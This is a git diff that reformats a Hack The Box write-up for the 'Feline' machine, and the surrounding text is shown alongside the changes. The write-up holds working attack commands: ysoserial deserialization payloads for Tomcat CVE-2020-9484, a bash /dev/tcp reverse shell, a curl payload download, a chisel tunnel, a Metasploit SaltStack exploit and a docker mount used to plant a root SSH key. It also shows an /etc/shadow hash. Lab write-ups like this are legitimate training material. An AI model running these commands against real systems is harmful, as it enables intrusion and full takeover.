@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/d09358b30b8a0d1cf35bd0283860b77c2fbe3623/linux-machines/hard/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with - Hard Linux
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with - Hard Linux
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +22,7 @@ Short description to include any strange things to be dealt with - Hard Linux
 
 I started my enumeration with an nmap scan of `10.10.10.205`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ nmap -sCV -n -p- -v 10.10.10.205 -oA feline    
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 11:49 EST
@@ -84,7 +84,7 @@ only two ports open, 22- SSH and 8080 - HTTP
 
 pic
 
-HTTP had a website, VirusBucket for uploading and testing files for malware. 
+HTTP had a website, VirusBucket for uploading and testing files for malware.
 
 pic
 
@@ -128,78 +128,78 @@ if (request.getParameter("cmd") != null) {
 </BODY></HTML>
 ```
 
-next tried uploading a `cmd.jsp` simple webshell from https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp and got a success message
+next tried uploading a `cmd.jsp` simple webshell from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) and got a success message
 
 renaming the files uploaded fixed the invalid filename error, filenames cannot have `-` or `_` in them...
 
 Googling the version of apache `Apache Tomcat 9.0.27` and file upload leads to pages that give instructions for deploying a web app through a `.war` file
 
-```
+```text
 <div id="error">
 org.apache.commons.fileupload.FileUploadBase$IOFileUploadException: Processing of multipart/form-data request failed. /opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp (Permission denied)
-	at org.apache.commons.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:351)
-	at org.apache.commons.fileupload.servlet.ServletFileUpload.parseRequest(ServletFileUpload.java:115)
-	at org.apache.jsp.upload_jsp._jspService(upload_jsp.java:165)
-	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
-	at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
-	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:476)
-	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:385)
-	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:329)
-	at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
-	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
-	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
-	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
-	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
-	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
-	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
-	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
-	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:526)
-	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
-	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
-	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:678)
-	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
-	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
-	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408)
-	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
-	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
-	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1579)
-	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
-	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
-	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
-	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
-	at java.base/java.lang.Thread.run(Thread.java:834)
+    at org.apache.commons.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:351)
+    at org.apache.commons.fileupload.servlet.ServletFileUpload.parseRequest(ServletFileUpload.java:115)
+    at org.apache.jsp.upload_jsp._jspService(upload_jsp.java:165)
+    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
+    at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
+    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:476)
+    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:385)
+    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:329)
+    at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
+    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+    at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:526)
+    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+    at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:678)
+    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408)
+    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
+    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1579)
+    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+    at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+    at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+    at java.base/java.lang.Thread.run(Thread.java:834)
 Caused by: java.io.FileNotFoundException: /opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp (Permission denied)
-	at java.base/java.io.FileOutputStream.open0(Native Method)
-	at java.base/java.io.FileOutputStream.open(FileOutputStream.java:298)
-	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:237)
-	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:187)
-	at org.apache.commons.io.output.DeferredFileOutputStream.thresholdReached(DeferredFileOutputStream.java:178)
-	at org.apache.commons.io.output.ThresholdingOutputStream.checkThreshold(ThresholdingOutputStream.java:224)
-	at org.apache.commons.io.output.ThresholdingOutputStream.write(ThresholdingOutputStream.java:128)
-	at org.apache.commons.fileupload.util.Streams.copy(Streams.java:107)
-	at org.apache.commons.fileupload.util.Streams.copy(Streams.java:70)
-	at org.apache.commons.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:347)
-	... 30 more
+    at java.base/java.io.FileOutputStream.open0(Native Method)
+    at java.base/java.io.FileOutputStream.open(FileOutputStream.java:298)
+    at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:237)
+    at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:187)
+    at org.apache.commons.io.output.DeferredFileOutputStream.thresholdReached(DeferredFileOutputStream.java:178)
+    at org.apache.commons.io.output.ThresholdingOutputStream.checkThreshold(ThresholdingOutputStream.java:224)
+    at org.apache.commons.io.output.ThresholdingOutputStream.write(ThresholdingOutputStream.java:128)
+    at org.apache.commons.fileupload.util.Streams.copy(Streams.java:107)
+    at org.apache.commons.fileupload.util.Streams.copy(Streams.java:70)
+    at org.apache.commons.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:347)
+    ... 30 more
 </div>
 ```
 
-Uploading a PNG file made it spit out a very verbose error message.  I could see in the output the location the files were being uploaded to: `/opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp`.  This gave me a chance to try to execute code if directory traversal was not blocked
+Uploading a PNG file made it spit out a very verbose error message. I could see in the output the location the files were being uploaded to: `/opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp`. This gave me a chance to try to execute code if directory traversal was not blocked
 
-according to https://tomcat.apache.org/tomcat-9.0-doc/changelog.html 9.0.41 is the newest version, so perhaps 9.0.27 has vulnerabilities
+according to [https://tomcat.apache.org/tomcat-9.0-doc/changelog.html](https://tomcat.apache.org/tomcat-9.0-doc/changelog.html) 9.0.41 is the newest version, so perhaps 9.0.27 has vulnerabilities
 
-https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.29
+[https://tomcat.apache.org/security-9.html\#Fixed\_in\_Apache\_Tomcat\_9.0.29](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.29)
 
-https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
+[https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
 
-https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html
+[https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html](https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html)
 
-> Apache Tomcat is affected by a Java deserialization vulnerability if the PersistentManager is configured as session manager. Successful exploitation requires the attacker to be able to upload an arbitrary file to the server. 
+> Apache Tomcat is affected by a Java deserialization vulnerability if the PersistentManager is configured as session manager. Successful exploitation requires the attacker to be able to upload an arbitrary file to the server.
 
-https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4
+[https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4](https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4)
 
-https://github.com/frohoff/ysoserial
+[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
 
-```
+```text
 #!/bin/bash
 
 bash -c "bash -I >& /dev/tcp/10.10.15.98/8990 0>&1"
@@ -207,7 +207,7 @@ bash -c "bash -I >& /dev/tcp/10.10.15.98/8990 0>&1"
 
 Downloaded the latest release of ysoserial and created my simple reverse shell script payload
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'curl http://10.10.15.98:9990/payload.sh -o /dev/shm/payload.sh' > downloadPayload.session
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
@@ -215,7 +215,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 
 Then followed the instructions to use ysoserial to create my malicious session file to deserialize
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'chmod 777 /dev/shm/payload.sh' > chmodPayload.session   
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
@@ -223,7 +223,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 
 The next malicious session file was used to give execute permissions to the first payload
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash /dev/shm/payload.sh' > executePayload.session
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
@@ -244,9 +244,9 @@ curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samp
 curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload'
 ```
 
-Finally I wrote a script to automate uploading all of these files to the server.  Next I ran a python3 http.server so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
+Finally I wrote a script to automate uploading all of these files to the server. Next I ran a python3 http.server so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ ./exploit.sh 
 
@@ -278,7 +278,7 @@ Each of the files were uploaded successfully, though they each threw a `HTTP Sta
 
 ## Road to User
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ python3 -m http.server 9990
 Serving HTTP on 0.0.0.0 port 9990 (http://0.0.0.0:9990/) ...
@@ -287,7 +287,7 @@ Serving HTTP on 0.0.0.0 port 9990 (http://0.0.0.0:9990/) ...
 
 Got a connection to my http.server, sending my payload on its way
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ script
 Script started, output log file is 'typescript'.
@@ -306,13 +306,11 @@ nc -lvnp 8991aa:~/htb/feline$
 tomcat@VirusBucket:/opt/tomcat$ export TERM=xterm-256color
 ```
 
- I started logging output with the `script` command, started a bash shell (since zsh seems to have problems with `stty raw -echo`), then started my netcat listener.  After running my `exploit.sh` I got a shell! 
- 
- 
+I started logging output with the `script` command, started a bash shell \(since zsh seems to have problems with `stty raw -echo`\), then started my netcat listener. After running my `exploit.sh` I got a shell!
 
 ### Further enumeration
 
-```
+```text
 Active Internet connections (servers and established)                                                   
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 127.0.0.1:46579         0.0.0.0:*               LISTEN      -                   
@@ -332,9 +330,9 @@ udp        0      0 10.10.10.205:59415      1.0.0.1:53              ESTABLISHED 
 udp        0      0 127.0.0.53:53           0.0.0.0:*
 ```
 
-Netstat showed that there were a few more ports open internally that I didn't see from my machine.  53, 4505, 4506, 8000, and 8005
+Netstat showed that there were a few more ports open internally that I didn't see from my machine. 53, 4505, 4506, 8000, and 8005
 
-```
+```text
 tomcat@VirusBucket:/dev/shm$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -370,7 +368,7 @@ There was a docker container hosted
 
 ### user.txt
 
-```
+```text
 tomcat@VirusBucket:/dev/shm$ cd ~
 tomcat@VirusBucket:~$ cat user.txt 
 a26df84070ff88060d77f79a027bed37
@@ -393,7 +391,7 @@ The user `tomcat` ended up being the user with the `user.txt` flag!
 
 ### Enumeration as `tomcat`
 
-```
+```text
 tomcat@VirusBucket:~$ cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
@@ -434,16 +432,16 @@ dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 
 only `tomcat` and `root` could log in with a shell
 
-```
+```text
 tomcat@VirusBucket:/dev/shm$ curl --max-time 2 --unix-socket /run/snapd.socket http://index
 {"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
 ```
 
-linpeas.sh showed that the socket `/run/snapd.socket` could be communicated with, so I validated it.  Since this socket was owned by root this could be a possible privesc method
+linpeas.sh showed that the socket `/run/snapd.socket` could be communicated with, so I validated it. Since this socket was owned by root this could be a possible privesc method
 
-https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection](https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection)
 
-```
+```text
 tomcat@VirusBucket:/dev/shm$ wget http://10.10.15.98:8099/socat
 --2020-12-13 21:56:26--  http://10.10.15.98:8099/socat
 Connecting to 10.10.15.98:8099... failed: Connection refused.
@@ -471,35 +469,35 @@ This socket did not seem to be vulnerable to this kind of injection
 
 Next I looked closer at the ports that were open internally. `SaltStack` uses ports 4505 and 4506 for its Salt master
 
-https://docs.saltstack.com/en/getstarted/system/communication.html#:~:text=The%20Salt%20master%20uses%20ports%204505%20and%204506%2C,which%20must%20be%20opened%20to%20accept%20incoming%20connections.
+[https://docs.saltstack.com/en/getstarted/system/communication.html\#:~:text=The Salt master uses ports 4505 and 4506%2C,which must be opened to accept incoming connections](https://docs.saltstack.com/en/getstarted/system/communication.html#:~:text=The%20Salt%20master%20uses%20ports%204505%20and%204506%2C,which%20must%20be%20opened%20to%20accept%20incoming%20connections).
 
-> Publisher	(port 4505) All Salt minions establish a persistent connection to the publisher port where they listen for messages. Commands are sent asynchronously to all connections over this port, which enables commands to be executed over large numbers of systems simultaniously.
-> 
-> Request Server	(port 4506) Salt minions connect to the request server as needed to send results to the Salt master, and to securely request files and minion-specific data values (called Salt pillar). Connections to this port are 1:1 between the Salt master and Salt minion (not asynchronous).
+> Publisher \(port 4505\) All Salt minions establish a persistent connection to the publisher port where they listen for messages. Commands are sent asynchronously to all connections over this port, which enables commands to be executed over large numbers of systems simultaniously.
+>
+> Request Server \(port 4506\) Salt minions connect to the request server as needed to send results to the Salt master, and to securely request files and minion-specific data values \(called Salt pillar\). Connections to this port are 1:1 between the Salt master and Salt minion \(not asynchronous\).
 
 I did not see a salt user so it was possible that this might be runnng as `root`
 
-https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt
+[https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt](https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt)
 
-https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/
+[https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/](https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/)
 
-> CVE-2020-16846: 
-
+> CVE-2020-16846:
+>
 > Impact: This CVE affects any users running the Salt API. An unauthenticated user with network access to the Salt API can use shell injections to run code on the Salt-API using the SSH client.
 
-https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/
+[https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/](https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/)
 
-https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection
+[https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection](https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection)
 
-links to metasploit module: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack_salt_api_cmd_exec.rb
+links to metasploit module: [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack\_salt\_api\_cmd\_exec.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack_salt_api_cmd_exec.rb)
 
-This module would require the port to be open from the outside, so I decided to make an SSH tunnel to give it a target to connect to.  Unfortunately, `tomcat`'s user folder was owned by root so I could not create a `.ssh` folder to inject my key.  Instead, I uploaded chisel and made a tunnel with that.
+This module would require the port to be open from the outside, so I decided to make an SSH tunnel to give it a target to connect to. Unfortunately, `tomcat`'s user folder was owned by root so I could not create a `.ssh` folder to inject my key. Instead, I uploaded chisel and made a tunnel with that.
 
-https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+[https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
 ### Getting a shell
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/chisel]
 └─$ ./chisel server -p 9909 --reverse -v
 2020/12/13 17:22:16 server: Reverse tunnelling enabled
@@ -509,7 +507,7 @@ https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 
 First I created a server on my machine listening for reverse connections
 
-```
+```text
 tomcat@VirusBucket:/dev/shm$ wget http://10.10.15.98:8099/chisel
 --2020-12-13 22:36:24--  http://10.10.15.98:8099/chisel
 Connecting to 10.10.15.98:8099... connected.
@@ -529,9 +527,9 @@ tomcat@VirusBucket:/dev/shm$ ./chisel client 10.10.15.98:9909 R:8000:127.0.0.1:8
 2020/12/13 22:36:41 client: Connected (Latency 37.60698ms)
 ```
 
-Then on the victim machine I downloaded chisel, made it executable, then created a reverse connection linking port 8000 on both machines (this was the port the msfconsole exploit wanted)
+Then on the victim machine I downloaded chisel, made it executable, then created a reverse connection linking port 8000 on both machines \(this was the port the msfconsole exploit wanted\)
 
-```
+```text
 msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > run
 
 [*] Started reverse SSL handler on 10.10.15.98:9967 
@@ -574,7 +572,7 @@ cd root
 
 for some reason executing some commands caused my connection to drop so I had to keep recreated the session
 
-```
+```text
 cat /root/todo.txt
 - Add saltstack support to auto-spawn sandbox dockers through events.
 - Integrate changes to tomcat and make the service open to public.
@@ -584,7 +582,7 @@ There was no `root.txt` in the /root folder, but there was a `todo.txt`
 
 switching the payload to cmd/unix/python//// made it much more stable
 
-```
+```text
 echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= zweilos@kali' > authorized_keys
 cat authorized_keys
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= zweilos@kali
@@ -596,9 +594,9 @@ hostname
 2d24bf61767c
 ```
 
-AFter trying a number of times to put my ssh key into the authorized_keys file and failing to log in, I realized that I was not on the host victim machine.  I must be inside a VM or container...
+AFter trying a number of times to put my ssh key into the authorized\_keys file and failing to log in, I realized that I was not on the host victim machine. I must be inside a VM or container...
 
-```
+```text
 root@2d24bf61767c:/# ip a
 ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
@@ -613,7 +611,7 @@ ip a
 
 the interface eth0 had an ip of 172.. which was a docker IP...I felt like this had been a bit too easy!
 
-```
+```text
 root@2d24bf61767c:~# cat .bash_history
 cat .bash_history
 paswd
@@ -650,15 +648,15 @@ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 exit
 ```
 
-the `root` user had a bash_history file that hadn't been set to /dev/null, and contained a few interesting commands
+the `root` user had a bash\_history file that hadn't been set to /dev/null, and contained a few interesting commands
 
-```
+```text
 root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 <t /var/run/docker.sock http://localhost/images/json
 [{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
 ```
 
-```
+```text
 root@2d24bf61767c:~# cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -685,7 +683,7 @@ sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
 
 I mimicked a few of the commands that were in the history to see if there were any clues
 
-```
+```text
 root@2d24bf61767c:~# cat /etc/shadow
 cat /etc/shadow
 root:$6$xuBu8hhhB5IfHFyz$uE5uLBJdph/cuyaTTAvVt5BRRyaLG7H5./yIVfukNpMeoYyIBGrXC7cou/bBOqDE2qbGD9OGqF8k72sq98sv9.:18443:0:99999:7:::
@@ -712,9 +710,9 @@ sshd:*:18385:0:99999:7:::
 
 from the command history I could see that root had set a password, so I copied the hash to my computer and tried to crack it...unsuccessfully
 
-https://docs.docker.com/engine/reference/commandline/exec/
+[https://docs.docker.com/engine/reference/commandline/exec/](https://docs.docker.com/engine/reference/commandline/exec/)
 
-```
+```text
 root@2d24bf61767c:~# docker ps
 docker ps
 bash: docker: command not found
@@ -722,18 +720,15 @@ bash: docker: command not found
 
 the docker command was not installed in the container, but since it was in the host, I copied it over from other shell
 
-https://docs.docker.com/storage/bind-mounts/
-using this I could mount the `/root` directory of the host machine to the container and then copy my ssh key over to enable login
+[https://docs.docker.com/storage/bind-mounts/](https://docs.docker.com/storage/bind-mounts/) using this I could mount the `/root` directory of the host machine to the container and then copy my ssh key over to enable login
 
-https://docs.docker.com/engine/reference/commandline/run/
+[https://docs.docker.com/engine/reference/commandline/run/](https://docs.docker.com/engine/reference/commandline/run/)
 
-https://docs.docker.com/engine/reference/commandline/images/
+[https://docs.docker.com/engine/reference/commandline/images/](https://docs.docker.com/engine/reference/commandline/images/)
 
-https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container
+[https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container](https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container)
 
-
-
-```
+```text
 root@2d24bf61767c:~# docker ps
 docker ps
 bash: docker: command not found
@@ -741,8 +736,7 @@ bash: docker: command not found
 
 docker command not availble inside container
 
-
-```
+```text
 tomcat@VirusBucket:/usr/bin$ python3 -m http.server 9999
 python3 -m http.server 9999
 Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
@@ -751,7 +745,7 @@ Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 
 Hosted python3 http.server from tomcat user in the `/usr/bin` folder
 
-```
+```text
 root@2d24bf61767c:~# wget http://172.17.0.1:9999/docker
 wget http://172.17.0.1:9999/docker
 --2020-12-13 23:34:47--  http://172.17.0.1:9999/docker
@@ -767,7 +761,7 @@ docker              100%[===================>]  81.09M   334MB/s    in 0.2s
 
 downloaded the docker program to the container
 
-```
+```text
 root@2d24bf61767c:~# chmod +x docker
 chmod +x docker
 root@2d24bf61767c:~# ./docker ps   
@@ -786,14 +780,14 @@ sandbox             latest              a24bb4013296        6 months ago        
 
 after some enumeration I was ready to craft my command to mount the filesystem
 
-```
+```text
 root@2d24bf61767c:~# ./docker run -v /root:/tmp -it sandbox:latest
 ./docker run -v /root:/tmp -it sandbox:latest
 ```
 
 I mounted `/root` from the host machine to `/tmp` in the container
 
-```
+```text
 / # ^[[28;5Rcd /tmp
 cd /tmp
 /tmp # ^[[28;8Rls -la
@@ -821,12 +815,11 @@ AAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8e
 mG+VqFZL/N0w=' >> .ssh/authorized_keys
 ```
 
-I changed directories to `/tmp` in the container, which now mirrored `/root` on the host machine.  I echoed my ssh key to `root`'s `authorized_keys` file, then tried to login with ssh
-
+I changed directories to `/tmp` in the container, which now mirrored `/root` on the host machine. I echoed my ssh key to `root`'s `authorized_keys` file, then tried to login with ssh
 
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ ssh root@10.10.10.205 -i tomcat.key                  
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
@@ -871,6 +864,7 @@ root@VirusBucket:~# cat root.txt
 cadbc87f7fbe8bff317c9db5063c9e63
 ```
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for... [something interesting or useful about this machine.]
+Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for... \[something interesting or useful about this machine.\]
 
